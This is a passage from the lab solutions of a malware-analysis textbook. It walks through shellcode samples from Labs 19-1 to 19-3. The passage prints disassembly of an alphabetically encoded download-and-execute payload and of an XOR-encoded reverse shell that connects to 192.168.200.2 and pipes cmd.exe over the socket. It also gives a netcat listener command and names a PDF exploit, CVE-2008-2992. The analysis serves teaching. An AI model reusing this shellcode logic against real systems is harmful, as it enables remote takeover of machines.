  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: URLDownloadToFileA
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The shellcode downloads this URL:'
  prefs: []
  type: TYPE_NORMAL
- en: '*http://www.practicalmalwareanalysis.com/shellcode/annoy_user.exe* 4\.'
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode writes *%SystemRoot%\System32\1.exe* and executes it.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode downloads a file from a URL stored within the encoded payload,
    writes it to disk, and executes it.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: 'You can perform dynamic analysis with the *shellcode_launcher.exe* utility
    with the following command line:'
  prefs: []
  type: TYPE_NORMAL
- en: shellcode_launcher.exe –i Lab19-01.bin -bp
  prefs: []
  type: TYPE_NORMAL
- en: The –bp option causes the program to execute a breakpoint instruction just prior
    to jumping to the shellcode buffer. If the system is configured with a just-in-time
    debugger, the breakpoint instruction will cause *shellcode_launcher.exe* to be
    loaded by the debugger (as discussed in Chapter 19). You can set OllyDbg as your
    just-in-time debugger by selecting **Options****Just-in-Time Debugging****Make
    OllyDbg Just-in-Time Debugger**.
  prefs: []
  type: TYPE_NORMAL
- en: If you do not set a just-in-time debugger, you can still run the program by
    specifying the *shellcode_launcher.exe* program as the executable to debug, but
    you must also be sure to provide the program arguments as well.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode decoder starts at  in Listing 19-1L. It uses an alphabetic encoding
    with each encoded byte between 0x41 ( *A*) and 0x50 ( *P*). Each payload byte
    is stored in the low 4-bit nibble of two encoded bytes. The decoder loads each
    pair of encoded bytes, subtracts the base value 0x41, shifts and adds the two
    values, and stores the value back to memory. The push shown at  is used to transfer
    control to the payload with the retn at .
  prefs: []
  type: TYPE_NORMAL
- en: 00000200 xor ecx, ecx 
  prefs: []
  type: TYPE_NORMAL
- en: 00000202 mov cx, 18Dh
  prefs: []
  type: TYPE_NORMAL
- en: 00000206 jmp short loc_21F
  prefs: []
  type: TYPE_NORMAL
- en: '**696**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00000208
  prefs: []
  type: TYPE_NORMAL
- en: 00000208 pop esi
  prefs: []
  type: TYPE_NORMAL
- en: 00000209 push esi 
  prefs: []
  type: TYPE_NORMAL
- en: 0000020A mov edi, esi
  prefs: []
  type: TYPE_NORMAL
- en: '0000020C loc_20C:'
  prefs: []
  type: TYPE_NORMAL
- en: 0000020C lodsb
  prefs: []
  type: TYPE_NORMAL
- en: 0000020D mov dl, al
  prefs: []
  type: TYPE_NORMAL
- en: 0000020F sub dl, 41h ; 'A'
  prefs: []
  type: TYPE_NORMAL
- en: 00000212 shl dl, 4
  prefs: []
  type: TYPE_NORMAL
- en: 00000215 lodsb
  prefs: []
  type: TYPE_NORMAL
- en: 00000216 sub al, 41h ; 'A'
  prefs: []
  type: TYPE_NORMAL
- en: 00000218 add al, dl
  prefs: []
  type: TYPE_NORMAL
- en: 0000021A stosb
  prefs: []
  type: TYPE_NORMAL
- en: 0000021B dec ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0000021C jnz short loc_20C
  prefs: []
  type: TYPE_NORMAL
- en: 0000021E retn 
  prefs: []
  type: TYPE_NORMAL
- en: '0000021F loc_21F:'
  prefs: []
  type: TYPE_NORMAL
- en: 0000021F call sub_208
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-1L: Shellcode decoder with alphabetic encoding* The start of the
    decoded payload begins at offset 0x224, where the code again performs a call/pop
    pair to obtain a pointer to data stored at the end of the payload. Two strings
    are stored here: URLMON and the URL http://'
  prefs: []
  type: TYPE_NORMAL
- en: www.practicalmalwareanalysis.com/shellcode/annoy_user.exe.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode uses the same findKernel32Base and findSymbolByHash functions
    described in Chapter 19 to manually resolve import functions. The findKernel32Base
    function returns the location of *kernel32.dll* in memory, and the findSymbolByHash
    function manually parses the provided DLL in memory, looking for the export symbol
    whose name hashes to the given DWORD value.
  prefs: []
  type: TYPE_NORMAL
- en: These function pointers are stored back onto the stack for use later. Listing
    19-2L shows the decoded shellcode searching for function imports.
  prefs: []
  type: TYPE_NORMAL
- en: 000002BF pop ebx
  prefs: []
  type: TYPE_NORMAL
- en: 000002C0 call findKernel32Base
  prefs: []
  type: TYPE_NORMAL
- en: 000002C5 mov edx, eax
  prefs: []
  type: TYPE_NORMAL
- en: 000002C7 push 0EC0E4E8Eh ; kernel32.dll:LoadLibraryA 000002CC push edx
  prefs: []
  type: TYPE_NORMAL
- en: 000002CD call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 000002D2 mov [ebp-4], eax
  prefs: []
  type: TYPE_NORMAL
- en: 000002D5 push 0B8E579C1h ; kernel32.dll:GetSystemDirectoryA 000002DA push edx
  prefs: []
  type: TYPE_NORMAL
- en: 000002DB call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 000002E0 mov [ebp-8], eax
  prefs: []
  type: TYPE_NORMAL
- en: 000002E3 push 78B5B983h ; kernel32.dll:TerminateProcess **1 9**
  prefs: []
  type: TYPE_NORMAL
- en: 000002E8 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 000002E9 call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 000002EE mov [ebp-0Ch], eax
  prefs: []
  type: TYPE_NORMAL
- en: 000002F1 push 7B8F17E6h ; kernel32.dll:GetCurrentProcess 000002F6 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 000002F7 call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 000002FC mov [ebp-10h], eax
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**697**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 000002FF push 0E8AFE98h ; kernel32.dll:WinExec 00000304 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 00000305 call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 0000030A mov [ebp-14h], eax
  prefs: []
  type: TYPE_NORMAL
- en: 0000030D lea eax, [ebx]
  prefs: []
  type: TYPE_NORMAL
- en: 0000030F push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00000310 call dword ptr [ebp-4] ; LoadLibraryA
  prefs: []
  type: TYPE_NORMAL
- en: 00000313 push 702F1A36h ; urlmon.dll:URLDownloadToFileA 00000318 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00000319 call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-2L: Shellcode resolving imports*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 19-3L shows the main functionality of the shellcode. The malware retrieves
    the system directory at , and then appends the string 1.exe at .
  prefs: []
  type: TYPE_NORMAL
- en: This is used as the local filesystem path argument to URLDownloadToFileA called
    at . This function is commonly found in shellcode. One function call performs
    an HTTP GET to the URL the code specifies and stores it at the specified file
    path. Here, the URL is the string stored at the end of the decoded shellcode.
    Finally, the shellcode executes the downloaded file at  before cleanly exiting.
  prefs: []
  type: TYPE_NORMAL
- en: 0000031E mov [ebp-18h], eax
  prefs: []
  type: TYPE_NORMAL
- en: 00000321 push 80h
  prefs: []
  type: TYPE_NORMAL
- en: 00000326 lea edi, [ebx+48h]
  prefs: []
  type: TYPE_NORMAL
- en: 00000329 push edi
  prefs: []
  type: TYPE_NORMAL
- en: 0000032A call dword ptr [ebp-8] ; GetSystemDirectoryA 
  prefs: []
  type: TYPE_NORMAL
- en: 0000032D add edi, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0000032F mov dword ptr [edi], 652E315Ch ; "\\1.e" 
  prefs: []
  type: TYPE_NORMAL
- en: 00000335 mov dword ptr [edi+4], 6578h ; "xe\x00"
  prefs: []
  type: TYPE_NORMAL
- en: 0000033C xor ecx, ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0000033E push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0000033F push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00000340 lea eax, [ebx+48h]
  prefs: []
  type: TYPE_NORMAL
- en: 00000343 push eax ; localFileSystemPath 00000344 lea eax, [ebx+7]
  prefs: []
  type: TYPE_NORMAL
- en: 00000347 push eax ; URL to download
  prefs: []
  type: TYPE_NORMAL
- en: 00000348 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 00000349 call dword ptr [ebp-18h] ; URLDownloadToFileA 
  prefs: []
  type: TYPE_NORMAL
- en: 0000034C push 5
  prefs: []
  type: TYPE_NORMAL
- en: 00000351 lea eax, [ebx+48h] ; path to executable 00000354 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00000355 call dword ptr [ebp-14h] ; WinExec 
  prefs: []
  type: TYPE_NORMAL
- en: 00000358 call dword ptr [ebp-10h] ; GetCurrentProcess 0000035B push 0
  prefs: []
  type: TYPE_NORMAL
- en: 00000360 push eax
  prefs: []
  type: TYPE_NORMAL
- en: '00000361 call dword ptr [ebp-0Ch] ; TerminateProcess *Listing 19-3L: Shellcode
    payload*'
  prefs: []
  type: TYPE_NORMAL
- en: '**698**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 19-2 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: The program process-injects the default web browser, Internet Explorer.
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode buffer is located at 0x407030\.
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode is XOR’ed with the byte 0xe7\.
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The shellcode manually imports the following functions:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: LoadLibraryA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: CreateProcessA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: TerminateProcess
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: GetCurrentProcess
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: WSAStartup
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: WSASocketA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: connect
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode connects to IP 192.168.200.2 on TCP port 13330\.
  prefs: []
  type: TYPE_NORMAL
- en: 6\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode provides a remote shell ( *cmd.exe*).
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
  type: TYPE_NORMAL
- en: The malware starts by determining the default web browser by reading the registry
    value HKCR\http\shell\open\command. The browser is created as a new process whose
    StartupInfo.wShowWindow value is set to SW_HIDE, so the process is hidden from
    the user interface. Process-injecting the default web browser is a common malware
    trick because it is normal for the web browser to perform network communications.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following functions are used by the process as part of the injection:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The function at 0x4010b0 gives the current process proper privileges to allow
    debugging.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The function at 0x401000 gets the path to the default web browser from the register.
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: The function at 0x401180 creates a new process, whose window is hidden in the
    GUI.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode buffer is located at 0x407030\. Because the shellcode is capable
    of bootstrapping itself, dynamic analysis can be easily performed by opening the
    *Lab19-02.exe* program in OllyDbg and setting the origin to the start of the shellcode
    buffer. Just remember that the shellcode is designed to **1 9**
  prefs: []
  type: TYPE_NORMAL
- en: execute within the web browser after it is process-injected, but it can be easier
    to perform dynamic analysis in the context of the *Lab19-02.exe* program.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**699**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: This shellcode is encoded with a single-byte XOR scheme. As shown in Listing
    19-4L, 0x18f bytes are XOR’ed with the value 0xe7 at .
  prefs: []
  type: TYPE_NORMAL
- en: 00407032 pop edi
  prefs: []
  type: TYPE_NORMAL
- en: 00407033 push small 18Fh
  prefs: []
  type: TYPE_NORMAL
- en: 00407037 pop cx
  prefs: []
  type: TYPE_NORMAL
- en: 00407039 mov al, 0E7h
  prefs: []
  type: TYPE_NORMAL
- en: '0040703B loc_40703B:'
  prefs: []
  type: TYPE_NORMAL
- en: 0040703B xor [edi], al 
  prefs: []
  type: TYPE_NORMAL
- en: 0040703D inc edi
  prefs: []
  type: TYPE_NORMAL
- en: 0040703E loopw loc_40703B
  prefs: []
  type: TYPE_NORMAL
- en: 00407041 jmp short near ptr unk_407048 
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-4L:* Lab19-02.exe *decode loop*'
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode payload begins at 0x407048\. Set a breakpoint on the jmp instruction
    at  in Listing 19-4L, and let the code run. The shellcode payload will be decoded
    and available for analysis.
  prefs: []
  type: TYPE_NORMAL
- en: The code performs a call/pop at  in Listing 19-5L to obtain the address of
    the function hashes located at 0x4071bb. Remember that all of the code listings
    that follow show disassembly of the decoded bytes, so viewing the payload prior
    to letting the decode loop run will show different values than those in the listings.
  prefs: []
  type: TYPE_NORMAL
- en: 004071B6 call loc_4070E3 
  prefs: []
  type: TYPE_NORMAL
- en: 004071BB dd 0EC0E4E8Eh ; kernel32.dll:LoadLibraryA 004071BF dd 16B3FE72h ; kernel32.dll:CreateProcessA
    004071C3 dd 78B5B983h ; kernel32.dll:TerminateProcess 004071C7 dd 7B8F17E6h ;
    kernel32.dll:GetCurrentProcess 004071CB dd 3BFCEDCBh ; ws2_32.dll:WSAStartup 004071CF
    dd 0ADF509D9h ; ws2_32.dll:WSASocketA 004071D3 dd 60AAF9ECh ; ws2_32.dll:connect
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-5L: Shellcode hash array*'
  prefs: []
  type: TYPE_NORMAL
- en: Next, the shellcode processes the array of symbol hashes, as shown in Listing
    19-6L. It uses the same findKernel32Base and findSymbolByHash as described in
    Chapter 19 and Lab 19-1\. It loads the next DWORD containing a symbol hash at
    , calls findSymbolByHash, and stores the result back to the same location at
    . This turns the array of hash values into a function pointer array.
  prefs: []
  type: TYPE_NORMAL
- en: 004070E3 pop esi
  prefs: []
  type: TYPE_NORMAL
- en: 004070E4 mov ebx, esi
  prefs: []
  type: TYPE_NORMAL
- en: 004070E6 mov edi, esi
  prefs: []
  type: TYPE_NORMAL
- en: 004070E8 call findKernel32Base
  prefs: []
  type: TYPE_NORMAL
- en: 004070ED mov edx, eax
  prefs: []
  type: TYPE_NORMAL
- en: 004070EF mov ecx, 4 C02 ; 4 symbols in kernel32
  prefs: []
  type: TYPE_NORMAL
- en: '004070F4 loc_4070F4:'
  prefs: []
  type: TYPE_NORMAL
- en: 004070F4 lodsd 
  prefs: []
  type: TYPE_NORMAL
- en: '**700**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 004070F5 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 004070F6 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 004070F7 call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 004070FC stosd 
  prefs: []
  type: TYPE_NORMAL
- en: 004070FD loop loc_4070F4
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-6L: Hash array processing*'
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode constructs the string "ws2_32" in Listing 19-7L on the stack by
    pushing two DWORD values at . The current ESP is passed as the argument to LoadLibraryA
    at  to load the *ws2_32.dll* library. This is a common trick to form short strings
    the shellcode needs while it executes. The shellcode then proceeds to process
    the three remaining hash values that reside in *ws2_32.dll* at .
  prefs: []
  type: TYPE_NORMAL
- en: 004070FF push 3233h ; "32\x00" 
  prefs: []
  type: TYPE_NORMAL
- en: 00407104 push 5F327377h ; "ws2_"
  prefs: []
  type: TYPE_NORMAL
- en: 00407109 push esp
  prefs: []
  type: TYPE_NORMAL
- en: 0040710A call dword ptr [ebx] ; LoadLibraryA 
  prefs: []
  type: TYPE_NORMAL
- en: 0040710C mov edx, eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040710E mov ecx, 3 ; 3 symbols in ws2_32 
  prefs: []
  type: TYPE_NORMAL
- en: '00407113 loc_407113:'
  prefs: []
  type: TYPE_NORMAL
- en: 00407113 lodsd
  prefs: []
  type: TYPE_NORMAL
- en: 00407114 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00407115 push edx
  prefs: []
  type: TYPE_NORMAL
- en: 00407116 call findSymbolByHash
  prefs: []
  type: TYPE_NORMAL
- en: 0040711B stosd
  prefs: []
  type: TYPE_NORMAL
- en: 0040711C loop loc_407113
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-7L: Importing ws2_32*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 19-8L shows the socket-creation code. The current ESP is masked with
    EAX at  to ensure that the stack is properly aligned for structures used by the
    Winsock library. The shellcode calls WSAStartup at  to initialize the library
    before any other networking function calls are made. It then calls WSASocketA
    at  to create a TCP socket. It relies on the value in EAX being 0, and then increments
    it to create the correct arguments to WSASocketA. The type value is 1 (SOC_STREAM),
    and the af value is 2 (AF_INET).
  prefs: []
  type: TYPE_NORMAL
- en: 0040711E sub esp, 230h
  prefs: []
  type: TYPE_NORMAL
- en: 00407124 mov eax, 0FFFFFFF0h
  prefs: []
  type: TYPE_NORMAL
- en: 00407129 and esp, eax 
  prefs: []
  type: TYPE_NORMAL
- en: 0040712B push esp
  prefs: []
  type: TYPE_NORMAL
- en: 0040712C push 101h
  prefs: []
  type: TYPE_NORMAL
- en: 00407131 call dword ptr [ebx+10h] ; WSAStartup 
  prefs: []
  type: TYPE_NORMAL
- en: '**1 9**'
  prefs: []
  type: TYPE_NORMAL
- en: 00407134 test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00407136 jnz short loc_4071AA
  prefs: []
  type: TYPE_NORMAL
- en: 00407138 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 00407139 push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040713A push eax
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**701**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: '0040713B push eax ; protocol 0: IPPROTO_IP'
  prefs: []
  type: TYPE_NORMAL
- en: 0040713C inc eax
  prefs: []
  type: TYPE_NORMAL
- en: '0040713D push eax ; type 1: SOCK_STREAM'
  prefs: []
  type: TYPE_NORMAL
- en: 0040713E inc eax
  prefs: []
  type: TYPE_NORMAL
- en: '0040713F push eax ; af 2: AF_INET'
  prefs: []
  type: TYPE_NORMAL
- en: 00407140 call dword ptr [ebx+14h] ; WSASocketA 
  prefs: []
  type: TYPE_NORMAL
- en: 00407143 cmp eax, 0FFFFFFFFh
  prefs: []
  type: TYPE_NORMAL
- en: 00407148 jz short loc_4071AA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-8L: Socket creation*'
  prefs: []
  type: TYPE_NORMAL
- en: 'Listing 19-9L shows the shellcode creating a struct sockaddr_in on the stack
    by pushing two DWORD values. The first at  is the value 2C8A8C0h. This is the
    network-byte-order value of the IP address the shellcode will connect to: 192.168.200.2\.
    The value at  is 12340002h, which is the sin_family (2: AF_INET) and sin_port
    values: 13330 (0x3412) in network-byte order. This sockaddr_in is passed to the
    call to connect at . Storing the IP address and port this way is extremely compact
    and makes static analysis much more difficult when trying to identify network
    hosts.'
  prefs: []
  type: TYPE_NORMAL
- en: 0040714A mov esi, eax
  prefs: []
  type: TYPE_NORMAL
- en: '0040714C push 2C8A8C0h  ; Server IP: 192.168.200.2 (c0.a8.c8.02) 0040714C
    ; in nbo: 0x02c8a8c0'
  prefs: []
  type: TYPE_NORMAL
- en: '00407151 push 12340002h  ; Server Port: 13330 (0x3412), AF_INET (2) 00407151
    ; in nbo: 0x12340002'
  prefs: []
  type: TYPE_NORMAL
- en: 00407156 mov ecx, esp
  prefs: []
  type: TYPE_NORMAL
- en: 00407158 push 10h ; sizeof sockaddr_in
  prefs: []
  type: TYPE_NORMAL
- en: 0040715D push ecx ; sockaddr_in pointer 0040715E push eax
  prefs: []
  type: TYPE_NORMAL
- en: 0040715F call dword ptr [ebx+18h] ; connect 
  prefs: []
  type: TYPE_NORMAL
- en: 00407162 test eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00407164 jnz short loc_4071AA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-9L: Socket connection*'
  prefs: []
  type: TYPE_NORMAL
- en: Listing 19-10L shows the shellcode responsible for creating the *cmd.exe* process.
    The code stores the command to execute ("cmd\x00") on the stack with a simple
    push at , and then saves the current ESP as a pointer for later use. The shellcode
    then prepares to call CreateProcessA. Most of the arguments are 0 (the contents
    of ECX), but note that at , bInheritHandles is 1, indicating that file handles
    opened by the shellcode will be available to the child process.
  prefs: []
  type: TYPE_NORMAL
- en: 00407166 push 646D63h ; "cmd\x00" 
  prefs: []
  type: TYPE_NORMAL
- en: 0040716B mov [ebx+1Ch], esp
  prefs: []
  type: TYPE_NORMAL
- en: 0040716E sub esp, 54h
  prefs: []
  type: TYPE_NORMAL
- en: 00407174 xor eax, eax
  prefs: []
  type: TYPE_NORMAL
- en: 00407176 mov ecx, 15h
  prefs: []
  type: TYPE_NORMAL
- en: 0040717B lea edi, [esp]
  prefs: []
  type: TYPE_NORMAL
- en: 0040717E rep stosd
  prefs: []
  type: TYPE_NORMAL
- en: 00407180 mov byte ptr [esp+10h], 44h ; sizeof(STARTUPINFO) 
  prefs: []
  type: TYPE_NORMAL
- en: 00407185 inc byte ptr [esp+3Ch] ; STARTF_USESHOWWINDOW 
  prefs: []
  type: TYPE_NORMAL
- en: '**702**'
  prefs: []
  type: TYPE_NORMAL
- en: Appendix C
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 00407189 inc byte ptr [esp+3Dh] ; STARTF_USESTDHANDLES
  prefs: []
  type: TYPE_NORMAL
- en: 0040718D mov eax, esi 
  prefs: []
  type: TYPE_NORMAL
- en: 0040718F lea edi, [esp+48h] ; &hStdInput 
  prefs: []
  type: TYPE_NORMAL
- en: 00407193 stosd ; hStdInput := socket 00407194 stosd ; hStdOutput := socket 00407195
    stosd ; hStdError := socket 00407196 lea eax, [esp+10h]
  prefs: []
  type: TYPE_NORMAL
- en: 0040719A push esp ; lpProcessInformation 0040719B push eax ; lpStartupInfo
  prefs: []
  type: TYPE_NORMAL
- en: 0040719C push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040719D push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040719E push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 0040719F push 1 ; bInheritHandles := True 
  prefs: []
  type: TYPE_NORMAL
- en: 004071A1 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 004071A2 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: '004071A3 push dword ptr [ebx+1Ch] ; lpCommandLine: "cmd"'
  prefs: []
  type: TYPE_NORMAL
- en: 004071A6 push ecx
  prefs: []
  type: TYPE_NORMAL
- en: 004071A7 call dword ptr [ebx+4] ; CreateProcessA
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 19-10L: Reverse shell creation*'
  prefs: []
  type: TYPE_NORMAL
- en: The STARTUPINFO struct is initialized on the stack, including the size at .
  prefs: []
  type: TYPE_NORMAL
- en: The dwFlags field is set to STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES at .
  prefs: []
  type: TYPE_NORMAL
- en: STARTF_USESHOWWINDOW indicates that the STARTUPINFO.wShowWindow field is valid.
  prefs: []
  type: TYPE_NORMAL
- en: This is zero-initialized, so the new process won’t be visible. STARTF_USESTDHANDLES
  prefs: []
  type: TYPE_NORMAL
- en: indicates that the STARTUPINFO.hStdInput, STARTUPINFO.hStdOutput, and STARTUPINFO
  prefs: []
  type: TYPE_NORMAL
- en: .hStdError fields are valid handles for the child process to use.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode moves the socket handle into EAX at  and loads the address of
    hStdInput at . The three stosd instructions store the socket handle in the three
    handle fields of the STARTUPINFO structure. This means that the new *cmd.exe*
    process will use the socket for all of its standard I/O. (This is a common method
    that was shown in Chapter 7.)
  prefs: []
  type: TYPE_NORMAL
- en: 'You can test connections to the control server by running Netcat on a host
    with the IP address 192.168.200.2 with this command: nc -l -p 13330'
  prefs: []
  type: TYPE_NORMAL
- en: Once Netcat is running, run *Lab19-02.exe* on another system. If you have set
    up networking correctly, the victim machine will connect to 192.168.200.2, and
    Netcat will show the Windows command-line banner. You can enter commands there
    as if you were sitting at the victim’s system.
  prefs: []
  type: TYPE_NORMAL
- en: '**Lab 19-3 Solutions**'
  prefs: []
  type: TYPE_NORMAL
- en: '**1 9**'
  prefs: []
  type: TYPE_NORMAL
- en: '***Short Answers***'
  prefs: []
  type: TYPE_NORMAL
- en: 1\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The PDF contains an example of CVE-2008-2992: buffer overflow related to Adobe
    Reader’s *util.printf* JavaScript implementation.'
  prefs: []
  type: TYPE_NORMAL
- en: 2\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode is encoded using JavaScript’s percent-encoding and is stored along
    with the JavaScript in the PDF.
  prefs: []
  type: TYPE_NORMAL
- en: Solutions to Labs
  prefs: []
  type: TYPE_NORMAL
- en: '**703**'
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  prefs: []
  type: TYPE_NORMAL
- en: 3\.
  prefs: []
  type: TYPE_NORMAL
- en: 'The shellcode manually imports the following functions:'
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: LoadLibraryA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: SetFilePointer
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: CreateProcessA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: ReadFile
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: TerminateProcess
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: WriteFile
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: GetCurrentProcess
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: CloseHandle
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: GetTempPathA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: GlobalAlloc
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: SetCurrentDirectoryA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: GlobalFree
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: CreateFileA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: ShellExecuteA
  prefs: []
  type: TYPE_NORMAL
- en: 
  prefs: []
  type: TYPE_NORMAL
- en: GetFileSize
  prefs: []
  type: TYPE_NORMAL
- en: 4\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode creates the files *%TEMP%\foo.exe* and *%TEMP%\bar.pdf*.
  prefs: []
  type: TYPE_NORMAL
- en: 5\.
  prefs: []
  type: TYPE_NORMAL
- en: The shellcode extracts two files stored encoded within the malicious PDF
  prefs: []
  type: TYPE_NORMAL
- en: and writes them to the user’s *%TEMP%* directory. It executes the *foo.exe*
    file and opens the *bar.pdf* document with the default handler.
  prefs: []
  type: TYPE_NORMAL
- en: '***Detailed Analysis***'
  prefs: []
